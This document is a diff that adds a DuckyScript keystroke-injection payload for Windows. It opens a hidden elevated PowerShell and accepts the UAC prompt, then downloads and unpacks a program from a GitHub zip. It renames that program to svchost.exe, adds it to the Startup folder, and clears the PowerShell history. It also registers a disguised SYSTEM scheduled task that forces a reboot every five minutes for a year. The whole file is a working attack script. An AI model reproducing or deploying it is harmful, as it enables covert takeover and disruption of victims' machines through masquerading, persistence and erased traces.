@@ -1,0 +1,99 @@
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden -Command "Start-Process powershell -Verb RunAs"
+ENTER
+DELAY 3500
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 1000
+
+STRING $installPath = "$env:LOCALAPPDATA\Blueteeth"
+ENTER
+DELAY 300
+
+STRING if (!(Test-Path $installPath)) { New-Item -ItemType Directory -Path $installPath }
+ENTER
+DELAY 500
+
+STRING Invoke-WebRequest -Uri "https://github.com/Berto1019/GooseTest/archive/refs/heads/main.zip" -OutFile "$env:TEMP\goosepython.zip"
+ENTER
+DELAY 2000
+
+STRING Expand-Archive -Path "$env:TEMP\goosepython.zip" -DestinationPath $installPath
+ENTER
+DELAY 2000
+
+STRING cd "$installPath\GooseTest-main"
+ENTER
+DELAY 500
+
+STRING Rename-Item -Path "GooseDesktop.exe" -NewName "svchost.exe"
+ENTER
+DELAY 500
+
+STRING $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\GooseDesktop.lnk")
+ENTER
+DELAY 300
+
+STRING $shell = New-Object -ComObject WScript.Shell
+ENTER
+DELAY 300
+
+STRING $shortcut = $shell.CreateShortcut($startupPath)
+ENTER
+DELAY 300
+
+STRING $shortcut.TargetPath = "$installPath\GooseTest-main\svchost.exe"
+ENTER
+DELAY 300
+
+STRING $shortcut.Save()
+ENTER
+DELAY 500
+
+STRING Clear-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+ENTER
+DELAY 300
+
+STRING $exePath = "$installPath\\GooseTest-main\\svchost.exe"
+ENTER
+DELAY 500
+
+REM --- Fixes 'Cannot create a file when that file already exists' error ---
+STRING Unregister-ScheduledTask -TaskName "SystemRebootTask" -Confirm:$false -ErrorAction SilentlyContinue
+ENTER
+DELAY 500
+
+REM --- 1. DEFINE THE REBOOT ACTION ---
+STRING $action = New-ScheduledTaskAction -Execute shutdown.exe -Argument "/r /f /t 60 /c ""System maintenance reboot required."""
+ENTER
+DELAY 500
+
+REM --- 2. DEFINE THE TRIGGER (Every 5 minute) ---
+STRING $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365) -Once -At (Get-Date)
+ENTER
+DELAY 500
+
+STRING Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemRebootTask" -Description "Maintains system component integrity." -User "SYSTEM"
+ENTER
+DELAY 500
+
+STRING Start-Process -FilePath .\svchost.exe
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING Clear-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+ENTER
+
+DELAY 1000
+STRING exit
+ENTER
+
+DELAY 200
+STRING exit
+ENTER
